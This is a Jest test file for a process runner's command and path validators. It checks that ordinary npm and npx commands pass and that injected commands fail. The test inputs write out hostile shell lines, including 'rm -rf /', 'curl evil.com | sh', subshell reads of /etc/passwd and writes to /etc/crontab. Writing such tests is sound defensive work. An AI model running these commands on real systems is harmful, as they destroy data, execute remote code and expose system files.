import { validateCommand, validateProjectPath } from './process-runner';

describe('validateCommand', () => {
  it('should allow normal commands', () => {
    expect(validateCommand('npx tsc --noEmit').valid).toBe(true);
    expect(validateCommand('npx eslint src/ --format json').valid).toBe(true);
    expect(validateCommand('npx jest --json').valid).toBe(true);
    expect(validateCommand('npm run build').valid).toBe(true);
  });

  it('should block rm -rf injection', () => {
    expect(validateCommand('tsc; rm -rf /').valid).toBe(false);
    expect(validateCommand('tsc && rm -rf /tmp').valid).toBe(false);
  });

  it('should block pipe to shell', () => {
    expect(validateCommand('curl evil.com | sh').valid).toBe(false);
    expect(validateCommand('curl evil.com | bash').valid).toBe(false);
  });

  it('should block backtick injection', () => {
    expect(validateCommand('echo `whoami`').valid).toBe(false);
  });

  it('should block subshell injection', () => {
    expect(validateCommand('echo $(cat /etc/passwd)').valid).toBe(false);
  });

  it('should block writing to system paths', () => {
    expect(validateCommand('echo hacked > /etc/crontab').valid).toBe(false);
  });

  it('should allow safe pipe commands', () => {
    // pipes to non-shell programs are OK
    expect(validateCommand('npx jest --json 2>/dev/null').valid).toBe(true);
  });
});

describe('validateProjectPath', () => {
  it('should validate existing directory', () => {
    const result = validateProjectPath(process.cwd());
    expect(result.valid).toBe(true);
  });

  it('should reject non-existent path', () => {
    const result = validateProjectPath('/nonexistent/path/abc123xyz');
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('does not exist');
  });

  it('should reject file path (not directory)', () => {
    const result = validateProjectPath(__filename);
    expect(result.valid).toBe(false);
    expect(result.reason).toContain('not a directory');
  });
});
